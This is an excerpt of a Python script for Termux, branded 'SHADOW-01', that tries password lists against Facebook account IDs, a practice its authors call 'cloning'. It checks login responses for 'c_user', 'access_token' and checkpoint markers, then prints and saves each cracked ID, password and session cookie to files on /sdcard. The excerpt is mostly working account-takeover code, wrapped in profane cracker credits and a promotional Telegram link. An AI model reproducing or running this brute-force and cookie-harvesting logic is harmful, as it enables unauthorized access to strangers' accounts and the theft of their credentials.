#- FUCKED BY - @DARK_SHADOW001
#- ALL BUG FIXED BY - SHADOW01
#- JOIN - @SHADOW_TRAM_001
...
\033[38;5;46m##    ## \033[37;1m##     ## \x1b[38;5;196m########  \033[33;1m##     ## \033[34;1m########  
\033[38;5;46m###   ## \033[37;1m##     ## \x1b[38;5;196m##     ## \033[33;1m##     ## \033[34;1m##     ## 
\033[38;5;46m####  ## \033[37;1m##     ## \x1b[38;5;196m##     ## \033[33;1m##     ## \033[34;1m##     ## 
\033[38;5;46m## ## ## \033[37;1m##     ## \x1b[38;5;196m########  \033[33;1m##     ## \033[34;1m########  
\033[38;5;46m##  #### \033[37;1m##     ## \x1b[38;5;196m##        \033[33;1m##     ## \033[34;1m##   ##   
...
os.system('xdg-open https://t.me/Termux_Shadow')
name=fuckx.upper()

jalan('\n\t>_ FUCKED BY - DARK_SHADOW001 ')
#jalan('\x1b[1;31mSHADOW CYBER  SHADOW-01 CLONING START PLEASE WAIT ..........')
time.sleep(3)
os.system('clear')
...
\033[38;5;46m##    ##  \033[37;1m#######  \x1b[38;5;196m##         \033[33;1m#######  \033[34;1m##     ##                                                
     {H} ╔════════════════════════{M}════════════════╗
      {H}║{M}[{H}•{M}] AUTHOR    :{H} JACKSON SHADOW          {N}{M}║
      {H}║{M}[{H}•{M}] FACEBOOK  : {H}SHADOW KING                {N}{M} ║
      {H}║{M}[{H}•{M}] GITHUB    : {H}GENERAL-CYBER-XD{N}         {H}   ║
      {M}║{M}[{H}•{M}] STATUS    : {H}PAID -XD{P}     {N}  {H}        ║
...
def main():
    os.system('clear')
    print('\n\n\n [😅] FUCK SHADOW PUSSY & POM POM  - LMNx9')
    time.sleep(4)
    os.system('clear')
    print(lol)
    print(f' ')
    
    print(f'{M}╔══[•] TOOL NAME : {H}SHADOW GREEN X')
    print(f'{M}║══[•] YOUR KEY  :{H} FUCKED BY - SHADOW01')#+key)
    print(f'{M}║══[•] VERSION   : {H}SHADOW-01')
    print(f'{M}╚══[•] CODER NAME: {H}JACKSON KING')
    print(f' ')
    print(f"{M}╔══[{M}1{RED}] \033[1;32mSTART SHADOW-01  CLONING {RED}(TCW)")
...
def _xxx_():
    ...
    print(f'{M}╚══[•] CODER NAME: {H}JACKSON KING')
    print(f' ')
    print(f"{M}╔══[{M}1{RED}] \033[1;32mSTART SHADOW-01  RANDOM {RED}(TCW)")
    print(f"{M}╔══[{M}2{RED}] \033[1;31mSTART SHADOW-01  X GMAIL {RED}(TCW)")
...
def shbd():
    ...
    print(f"")
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/SHADOW/JACKSON/OGGY')
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
...
def gmail():
    ...
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}SHADOW{P}][{B}MASUD{P}][{K}MAHIN{P}][{K}FAHIM{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff = input(f' CHOOSE :{H} ')
    gg = ff.lower()
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            shanto = random.choice(["\x1b[1;91mSHADOW","\x1b[1;92mSHADOW","\x1b[1;93mSHADOW","\x1b[1;94mSHADOW","\x1b[1;95mSHADOW","\x1b[1;96mSHADOW","\x1b[1;97mSHADOW","\x1b[1;91mSHADOW","\x1b[1;92mSHADOW","\x1b[1;93mSHADOW","\x1b[1;94mSHADOW","\x1b[1;95mSHADOW","\x1b[1;96mSHADOW"])
...
#-------[ UP- 12/06/ LMNx9 ]---------
            ...
            if 'm_page_voice' in log_cookies:
                ...
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[SHADOW-LOK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/SHADOW-LOK.txt', 'a').write(uidf+' | '+ps+'\n')
                lok.append(uidf)
            elif 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[SHADOW-OK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/SHADOW-OK.txt', 'a').write(uidf+' | '+ps+'\n')
                ok.append(uidf)
            elif '/x/checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uidf=coki[141:156]
                    if 'y' in hello:
                      print('    \033[1;91m[SHADOW-2F] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                      print(f'    {RED}[COOKI💉] {RED}'+coki)
                      open('/sdcard/SHADOW-2F.txt', 'a').write(uidf+' | '+ps+'\n')
                    twf.append(uidf)
                    break
            else:
                continue
...
def n(uid,pwx,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mSHADOW\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            # = random.choice(["\x1b[1;91mSHADOW","\x1b[1;92mSHADOW","\x1b[1;93mSHADOW","\x1b[1;94mSHADOW","\x1b[1;95mSHADOW","\x1b[1;96mSHADOW","\x1b[1;97mSHADOW","\x1b[1;91mSHADOW","\x1b[1;92mSHADOW","\x1b[1;93mSHADOW","\x1b[1;94mSHADOW","\x1b[1;95mSHADOW","\x1b[1;96mSHADOW"])
...
#-----[ UPDATE GRAPH - 12/06 LMNx9 ]
            ...
            if 'access_token' in po:
                ...
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[SHADOW-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/SHADOW-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            animasi = random.choice(["\x1b[1;91mSHADOW","\x1b[1;92mSHADOW","\x1b[1;93mSHADOW","\x1b[1;94mSHADOW","\x1b[1;95mSHADOW","\x1b[1;96mSHADOW","\x1b[1;97mSHADOW","\x1b[1;91mSHADOW","\x1b[1;92mSHADOW","\x1b[1;93mSHADOW","\x1b[1;94mSHADOW","\x1b[1;95mSHADOW","\x1b[1;96mSHADOW"])
            ...
            if 'access_token' in po:
                ...
                print('    \033[1;92m[SHADOW-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/SHADOW-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                ok.append(uidf)
            elif 'www.facebook.com' in po['error_msg']:
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[SHADOW-CP] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/SHADOW-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                cp.append(uidf)
                break
